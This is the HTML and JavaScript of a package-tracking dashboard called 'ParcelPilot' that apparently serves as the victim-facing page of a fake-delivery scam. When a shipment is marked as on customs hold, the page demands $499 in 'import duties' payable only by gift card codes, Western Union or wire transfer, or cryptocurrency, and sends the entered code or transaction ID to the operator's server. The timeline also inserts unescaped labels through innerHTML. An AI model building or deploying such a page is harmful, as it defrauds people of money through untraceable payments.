<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ParcelPilot — Tracking Dashboard</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
  <link rel="stylesheet" href="/styles.css">
  <style>
    #map { height: 400px; border-radius: 16px; z-index: 1; }
    .dashboard-container { max-width: 1100px; margin: 0 auto; padding: 24px 20px; }
    .tracking-id { font-size: 32px; font-weight: 800; }
    .tracking-id span { color: #667eea; }
    .dashboard-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 24px; }
    .dashboard-card { background: var(--card-bg); border-radius: 16px; padding: 24px; border: 1px solid var(--border); }
    .card-full { grid-column: 1 / -1; }
    .card-title { font-size: 14px; font-weight: 600; text-transform: uppercase; color: var(--text-secondary); margin-bottom: 16px; }
    .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--border); }
    .info-label { color: var(--text-secondary); font-size: 14px; }
    .info-value { font-weight: 600; }
    .status-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 16px; border-radius: 100px; font-size: 14px; font-weight: 600; margin: 8px 0; }
    .timeline { position: relative; padding-left: 32px; }
    .timeline::before { content: ''; position: absolute; left: 11px; top: 8px; bottom: 8px; width: 2px; background: var(--border); }
    .timeline-item { padding-bottom: 20px; position: relative; }
    .timeline-dot { position: absolute; left: -24px; top: 4px; width: 14px; height: 14px; border-radius: 50%; border: 2px solid #667eea; background: var(--card-bg); }
    .timeline-dot.active { background: #667eea; }
    .customs-alert { background: #FEF3C7; border: 2px solid #F59E0B; border-radius: 16px; padding: 24px; margin-top: 20px; display: none; }
    .customs-alert h3 { color: #92400E; }
    .customs-amount { font-size: 36px; font-weight: 800; color: #DC2626; margin: 12px 0; }
    .customs-form { display: flex; flex-direction: column; gap: 12px; margin-top: 16px; }
    .customs-form select, .customs-form input { padding: 12px; border-radius: 10px; border: 1px solid #D1D5DB; font-family: Inter; }
    .customs-form button { padding: 14px; background: #DC2626; color: white; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; }
    .loader { display: flex; justify-content: center; padding: 100px; }
    @media (max-width: 768px) { .dashboard-grid { grid-template-columns: 1fr; } #map { height: 250px; } }
  </style>
</head>
<body>
  <nav class="nav">
    <div class="nav-inner">
      <div class="nav-brand"><span class="nav-logo">✈️</span><span class="nav-name">ParcelPilot</span></div>
      <div class="nav-links">
        <a href="/" class="nav-link">Home</a>
        <a href="/admin.html" class="nav-link">Admin</a>
      </div>
    </div>
  </nav>

  <div class="dashboard-container">
    <div id="loader" class="loader"><div style="animation: spin 0.8s linear infinite; width: 40px; height: 40px; border: 4px solid #e5e7eb; border-top-color: #667eea; border-radius: 50%;"></div></div>
    <div id="content" style="display:none;">
      <div class="tracking-id">#<span id="trackingDisplay"></span></div>
      <div id="statusBadge" class="status-badge">📦 Loading...</div>
      <div id="map"></div>
      <div id="customsAlert" class="customs-alert">
        <h3>🛃 Customs Hold — Action Required</h3>
        <p>Import duties required to release package:</p>
        <div class="customs-amount">$<span id="customsAmount">499</span> USD</div>
        <div class="customs-form">
          <select id="paymentMethod">
            <option value="">Select payment method...</option>
            <option value="gift_card">Gift Card (Apple/Amazon/Google Play)</option>
            <option value="wire">Wire Transfer / Western Union</option>
            <option value="crypto">Cryptocurrency (USDT/BTC)</option>
          </select>
          <input type="text" id="paymentRef" placeholder="Gift card code / Transaction ID">
          <button id="payBtn">✅ VERIFY PAYMENT & RELEASE PACKAGE</button>
        </div>
      </div>
      <div class="dashboard-grid">
        <div class="dashboard-card">
          <div class="card-title">📦 Package Details</div>
          <div class="info-row"><span class="info-label">Type</span><span class="info-value" id="pkgType">—</span></div>
          <div class="info-row"><span class="info-label">Value</span><span class="info-value" id="pkgValue">—</span></div>
          <div class="info-row"><span class="info-label">Route</span><span class="info-value" id="routeInfo">—</span></div>
        </div>
        <div class="dashboard-card">
          <div class="card-title">📋 Timeline</div>
          <div class="timeline" id="timeline"></div>
        </div>
      </div>
    </div>
    <div id="error" style="display:none; text-align:center; padding:80px;">
      <h2>🔍 Shipment Not Found</h2>
      <p style="color:var(--text-secondary);">Check your tracking number and try again.</p>
      <a href="/" style="display:inline-block;margin-top:16px;padding:12px 24px;background:#667eea;color:white;border-radius:10px;text-decoration:none;">← Back</a>
    </div>
  </div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script>
    const params = new URLSearchParams(window.location.search);
    const trackingId = params.get('tracking');
    if (!trackingId) { document.getElementById('loader').style.display = 'none'; document.getElementById('error').style.display = 'block'; }

    let map, marker;

    async function load() {
      try {
        const res = await fetch('/api/shipments/' + trackingId);
        const data = await res.json();
        if (!data.success) throw new Error('Not found');
        const s = data.shipment;
        document.getElementById('loader').style.display = 'none';
        document.getElementById('content').style.display = 'block';
        
        document.getElementById('trackingDisplay').textContent = s.trackingId;
        document.getElementById('pkgType').textContent = s.packageType || 'General Cargo';
        document.getElementById('pkgValue').textContent = '$' + (s.packageValue || '—');
        document.getElementById('routeInfo').textContent = s.origin + ' → ' + s.destination;

        const statusColors = { pending: '#6B7280', picked_up: '#3B82F6', in_transit: '#3B82F6', customs_hold: '#F59E0B', customs_cleared: '#10B981', out_for_delivery: '#10B981', delivered: '#10B981' };
        const badge = document.getElementById('statusBadge');
        badge.textContent = '📦 ' + s.status.replace(/_/g, ' ');
        badge.style.background = (statusColors[s.status] || '#6B7280') + '20';
        badge.style.color = statusColors[s.status] || '#6B7280';

        if (s.status === 'customs_hold' && !s.customsPaid) {
          document.getElementById('customsAlert').style.display = 'block';
          document.getElementById('customsAmount').textContent = (s.customsAmount || 499).toFixed(2);
        }

        const timeline = document.getElementById('timeline');
        timeline.innerHTML = '';
        (s.events || [{ type: 'created', label: 'Shipment Created', timestamp: s.createdAt }]).forEach((e, i) => {
          timeline.innerHTML += `<div class="timeline-item">
            <div class="timeline-dot ${i === (s.events||[]).length-1 ? 'active' : ''}"></div>
            <div style="font-weight:600;">${e.label}</div>
            <div style="font-size:13px;color:var(--text-secondary);">${e.timestamp ? new Date(e.timestamp).toLocaleString() : ''}</div>
          </div>`;
        });

        // Map
        map = L.map('map', { center: [30, 0], zoom: 2, zoomControl: false, attributionControl: false });
        L.tileLayer('https://{s}.basemaps.cartocdn.com/light_all/{z}/{x}/{y}{r}.png', { maxZoom: 19, subdomains: 'abcd' }).addTo(map);
        
        const latlngs = [[s.originLat, s.originLng], ...(s.waypoints||[]).map(w=>[w.lat,w.lng]), [s.destLat, s.destLng]];
        L.polyline(latlngs, { color: '#667eea', weight: 3, opacity: 0.5, dashArray: '10,10' }).addTo(map);
        L.circleMarker([s.originLat, s.originLng], { radius: 8, color: '#667eea', fillColor: '#667eea', fillOpacity: 0.4 }).addTo(map);
        L.circleMarker([s.destLat, s.destLng], { radius: 8, color: '#10B981', fillColor: '#10B981', fillOpacity: 0.4 }).addTo(map);

        const idx = s.currentWaypointIndex || 0;
        const pos = idx < latlngs.length ? latlngs[idx] : latlngs[latlngs.length-1];
        marker = L.marker(pos).addTo(map);
        map.fitBounds(L.latLngBounds(latlngs), { padding: [60,60] });

        // Animate if in transit
        if (['in_transit','customs_hold','customs_cleared','out_for_delivery'].includes(s.status)) {
          let pi = 0;
          setInterval(() => {
            if (pi < latlngs.length) { marker.setLatLng(latlngs[pi]); pi++; }
          }, 2000);
        }

      } catch(e) {
        document.getElementById('loader').style.display = 'none';
        document.getElementById('error').style.display = 'block';
      }
    }

    document.getElementById('payBtn')?.addEventListener('click', async () => {
      const method = document.getElementById('paymentMethod').value;
      const ref = document.getElementById('paymentRef').value.trim();
      if (!method || !ref) { alert('Fill all fields'); return; }
      const btn = document.getElementById('payBtn');
      btn.disabled = true; btn.textContent = '⏳ Processing...';
      try {
        const res = await fetch('/api/shipments/' + trackingId + '/pay-customs', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ paymentMethod: method, paymentReference: ref })
        });
        const data = await res.json();
        if (data.success) { alert('✅ Payment verified! Package releasing.'); location.reload(); }
        else alert('Error: ' + (data.error || 'Failed'));
      } catch(e) { alert('Connection error'); }
      btn.disabled = false; btn.textContent = '✅ VERIFY PAYMENT & RELEASE PACKAGE';
    });

    load();
  </script>
  <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
</body>
  </html>
